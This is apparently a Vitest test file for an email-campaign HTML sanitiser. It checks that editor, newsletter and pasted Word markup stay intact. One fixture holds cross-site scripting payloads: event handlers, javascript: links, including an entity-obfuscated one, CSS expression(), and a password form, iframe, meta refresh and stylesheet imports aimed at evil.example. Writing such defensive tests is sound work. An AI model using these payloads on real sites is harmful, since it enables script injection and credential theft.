import { describe, it, expect } from "vitest";
import { sanitizeCampaignHtml } from "../sanitize-campaign-html";

// Representative, locally written campaign fixtures (no production record is read): what the CRM's own editor produces, what a newsletter author pastes
// from an email template, what Word/Outlook produce, and a hostile mix. The point is the compatibility question "does legitimate content stay readable and
// visually intact?" - so each legitimate fixture is checked for (1) every word of visible text surviving, (2) the structure and the inline styling an email
// client actually renders surviving, and (3) the things that are dropped being exactly the things that must be dropped. The detailed hostile-payload and
// idempotency cases live in sanitize-campaign-html.test.ts.

const text = (html: string) =>
  html
    .replace(/<(script|style)[\s\S]*?<\/\1>/gi, "")
    .replace(/<!--[\s\S]*?-->/g, "")
    .replace(/<[^>]*>/g, " ")
    .replace(/&nbsp;|&#160;/g, " ")
    .replace(/&mdash;/g, "—") // the sanitiser writes these characters out literally; compare like with like
    .replace(/&bull;/g, "•")
    .replace(/&amp;/g, "&")
    .replace(/\s+/g, " ")
    .trim();

// What the editor (TipTap starter kit + Link + Image) writes: no classes, no inline styles except text-align, links with rel/target.
const EDITOR_OUTPUT =
  `<h2>Winter fares are live</h2>` +
  `<p>Hello <strong>{{firstName}}</strong>, <em>great</em> news with <u>our</u> <s>old</s> deals: <a target="_blank" rel="noopener noreferrer nofollow" href="https://www.example.com/deals?utm_source=crm&utm_campaign=winter">see them here</a>.</p>` +
  `<ul><li><p>Paris from $499</p></li><li><p>Tokyo from $899</p></li></ul>` +
  `<ol><li><p>Pick a date</p></li><li><p>Send a request</p></li></ol>` +
  `<blockquote><p>"The best business-class fares I have found." &mdash; a traveller</p></blockquote>` +
  `<p style="text-align: center"><img src="https://cdn.example.com/paris.jpg" alt="The Eiffel Tower" title="Paris" width="560"></p>` +
  `<hr><pre><code>CODE-1234</code></pre><p>Questions? <a href="mailto:info@example.com">info@example.com</a> or <a href="tel:+14155709267">+1 415 570 9267</a>.</p>`;

// A typical hand-built newsletter: nested layout tables, presentational attributes and inline CSS, a call-to-action button, a footer.
const NEWSLETTER =
  `<table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f4f4f4" role="presentation"><tr><td align="center">` +
  `<table width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border:1px solid #e5e5e5;border-radius:8px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;">` +
  `<tr><td style="padding:24px 32px;background:#0a2540;color:#ffffff;font-size:22px;font-weight:bold;letter-spacing:0.5px;">Business Flights Travel</td></tr>` +
  `<tr><td style="padding:32px;font-size:16px;line-height:1.5;color:#333333;">` +
  `<h1 style="margin:0 0 16px 0;font-size:28px;color:#0a2540;">Fly business class for less</h1>` +
  `<p style="margin:0 0 16px 0;">Fares to <span style="color:#b8860b;font-weight:600;">London</span>, <span style="color:#b8860b;font-weight:600;">Paris</span> and Rome.</p>` +
  `<a href="https://www.example.com/quote" target="_blank" style="display:inline-block;padding:12px 24px;background-color:#0a2540;color:#ffffff;border-radius:6px;text-decoration:none;font-weight:bold;">Get a free quote</a>` +
  `<p style="margin:24px 0 0 0;font-size:12px;color:#888888;text-align:center;">580 Example Street &bull; <a href="https://www.example.com/unsubscribe?token=abc123" style="color:#888888;text-decoration:underline;">Unsubscribe</a></p>` +
  `</td></tr></table></td></tr></table>`;

// What Word / Outlook / an old template pastes in: Mso classes and styles, conditional comments, <o:p>, <font>, a <style> block, class attributes.
const PASTED =
  `<!--[if gte mso 9]><xml><o:OfficeDocumentSettings><o:AllowPNG/></o:OfficeDocumentSettings></xml><![endif]-->` +
  `<style>.MsoNormal{margin:0} .btn{background:#c00}</style>` +
  `<p class="MsoNormal" style="margin:0in;font-size:11.0pt;font-family:Calibri,sans-serif;mso-bidi-font-size:10.0pt;mso-fareast-language:EN-US">` +
  `Dear <font color="#cc0000" face="Arial" size="3">traveller</font>,<o:p></o:p></p>` +
  `<p class="MsoNormal"><b>Your itinerary</b> is attached.<o:p>&nbsp;</o:p></p>` +
  `<div class="footer" id="f1" data-track="x"><span class="small">Thank you</span></div>`;

const HOSTILE =
  `<p onclick="steal()">Hello</p><script>alert(1)</script><img src=x onerror="alert(2)"><a href="javascript:alert(3)">click</a>` +
  `<a href=" jav&#x61;script:alert(4)">entity</a><iframe src="https://evil.example"></iframe><form action="https://evil.example"><input name="pw"></form>` +
  `<svg onload="alert(5)"><circle/></svg><style>@import url(https://evil.example/x.css);</style>` +
  `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:url(https://evil.example/p.png)">cover</div>` +
  `<p style="width:expression(alert(6));color:red">expr</p><a href="data:text/html,<script>alert(7)</script>">data</a>` +
  `<object data="x"></object><embed src="x"><base href="https://evil.example"><meta http-equiv="refresh" content="0;url=https://evil.example"><link rel="stylesheet" href="https://evil.example/s.css">`;

describe("editor output (what the CRM's own campaign editor produces)", () => {
  const out = sanitizeCampaignHtml(EDITOR_OUTPUT);

  it("every word of visible text survives", () => {
    expect(text(out)).toBe(text(EDITOR_OUTPUT));
  });

  it("keeps the structure: heading, emphasis, lists, quote, rule, preformatted text, image with alt/title/width, mailto and tel links", () => {
    for (const fragment of ["<h2>", "<strong>{{firstName}}</strong>", "<em>great</em>", "<u>our</u>", "<s>old</s>", "<ul>", "<ol>", "<blockquote>", "<hr />", "<pre><code>CODE-1234</code></pre>", 'href="mailto:info@example.com"', 'href="tel:+14155709267"']) {
      expect(out, fragment).toContain(fragment);
    }
    expect(out).toMatch(/<img [^>]*src="https:\/\/cdn\.example\.com\/paris\.jpg"[^>]*alt="The Eiffel Tower"[^>]*>/);
    expect(out).toMatch(/<img [^>]*width="560"/);
    expect(out).toContain('style="text-align:center"'); // centred paragraph keeps its alignment
  });

  it("keeps the link target, the tracking query string, and the safe rel (the editor's extra 'nofollow' is replaced by noopener noreferrer)", () => {
    expect(out).toMatch(/<a [^>]*href="https:\/\/www\.example\.com\/deals\?utm_source=crm&amp;utm_campaign=winter"/);
    expect(out).toMatch(/target="_blank"/);
    expect(out).toMatch(/rel="noopener noreferrer"/);
  });

  it("is idempotent: cleaning the cleaned output changes nothing (safe to apply at save, preview and send)", () => {
    expect(sanitizeCampaignHtml(out)).toBe(out);
  });

  it("merge-style placeholders in text and in a link target are left alone for the sending code", () => {
    const html = `<p>Hi {{firstName}} [first_name]</p><p><a href="{{unsubscribe_url}}">Unsubscribe</a></p>`;
    const cleaned = sanitizeCampaignHtml(html);
    expect(cleaned).toContain("Hi {{firstName}} [first_name]");
    expect(cleaned).toContain('href="{{unsubscribe_url}}"');
  });
});

describe("a hand-built newsletter template (layout tables and inline CSS)", () => {
  const out = sanitizeCampaignHtml(NEWSLETTER);

  it("every word of visible text survives", () => {
    expect(text(out)).toBe(text(NEWSLETTER));
  });

  it("keeps the nested tables with their presentational attributes", () => {
    expect(out).toContain('<table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f4f4f4" role="presentation">');
    expect(out).toContain('<td align="center">');
    expect(out).toContain('<table width="600" cellpadding="0" cellspacing="0"');
  });

  it("keeps the inline styling an email client renders: colours, fonts, spacing, borders, radius, sizing, weight", () => {
    for (const declaration of ["background-color:#ffffff", "border:1px solid #e5e5e5", "border-radius:8px", "padding:24px 32px", "background:#0a2540", "color:#ffffff", "font-size:22px", "font-weight:bold", "letter-spacing:0.5px", "line-height:1.5", "margin:0 0 16px 0", "text-align:center", "text-decoration:underline"]) {
      expect(out, declaration).toContain(declaration);
    }
    expect(out).toMatch(/font-family:'Helvetica Neue',Helvetica,Arial,sans-serif|font-family:"Helvetica Neue",Helvetica,Arial,sans-serif/);
  });

  it("keeps the call-to-action button exactly as a styled link (inline-block, padding, background, radius)", () => {
    const button = out.match(/<a [^>]*>Get a free quote<\/a>/)?.[0] ?? "";
    expect(button).toContain('href="https://www.example.com/quote"');
    for (const declaration of ["display:inline-block", "padding:12px 24px", "background-color:#0a2540", "border-radius:6px", "text-decoration:none"]) expect(button, declaration).toContain(declaration);
  });

  it("keeps the footer's unsubscribe link and entity text", () => {
    expect(out).toContain('href="https://www.example.com/unsubscribe?token=abc123"');
    expect(text(out)).toContain("580 Example Street \u2022 Unsubscribe");
  });
});

describe("pasted Word / Outlook / legacy markup", () => {
  const out = sanitizeCampaignHtml(PASTED);

  it("every word of visible text survives, and the page furniture goes: style block, conditional comment, Office XML", () => {
    expect(text(out)).toBe("Dear traveller, Your itinerary is attached. Thank you");
    expect(out).not.toMatch(/<style|\.MsoNormal|\[if|<xml|OfficeDocumentSettings|<o:/i);
  });

  it("keeps real typography (size, family, margin) and bold; drops Mso-only declarations, class/id/data attributes", () => {
    expect(out).toContain("font-size:11.0pt");
    expect(out).toContain("font-family:Calibri,sans-serif");
    expect(out).toContain("margin:0in");
    expect(out).toContain("<b>Your itinerary</b>");
    expect(out).not.toMatch(/mso-|class=|id="f1"|data-track/);
  });

  it("KNOWN LIMIT (documented, not a defect): <font> loses its colour/face/size - the text stays; a stored campaign relying on <font color> loses that colouring", () => {
    expect(out).toContain("traveller");
    expect(out).not.toMatch(/<font|color="#cc0000"/);
  });

  it("KNOWN LIMIT: float, flex layouts and shadows are not on the allow-list and are removed; the content stays readable in normal flow", () => {
    const cleaned = sanitizeCampaignHtml(`<div style="float:right;display:flex;box-shadow:0 0 4px #000;color:#123456">Text</div>`);
    expect(cleaned).toContain("Text");
    expect(cleaned).toContain("color:#123456");
    expect(cleaned).not.toMatch(/float|flex|box-shadow/);
  });
});

describe("the same sanitiser, a hostile mix", () => {
  const out = sanitizeCampaignHtml(HOSTILE);

  it("nothing executable, fetchable, embeddable or posting survives", () => {
    expect(out).not.toMatch(/<script|<iframe|<form|<input|<svg|<object|<embed|<base|<meta|<link|<style/i);
    expect(out).not.toMatch(/onclick|onerror|onload/i);
    expect(out).not.toMatch(/javascript:|vbscript:|data:text|expression\(|@import|url\(|position:\s*fixed/i);
    expect(out).not.toMatch(/evil\.example/);
  });

  it("the harmless text in the same document is still there", () => {
    expect(text(out)).toContain("Hello");
    expect(text(out)).toContain("click");
    expect(text(out)).toContain("cover");
    expect(out).toContain("color:red"); // the safe declaration next to the dangerous one survives
  });
});
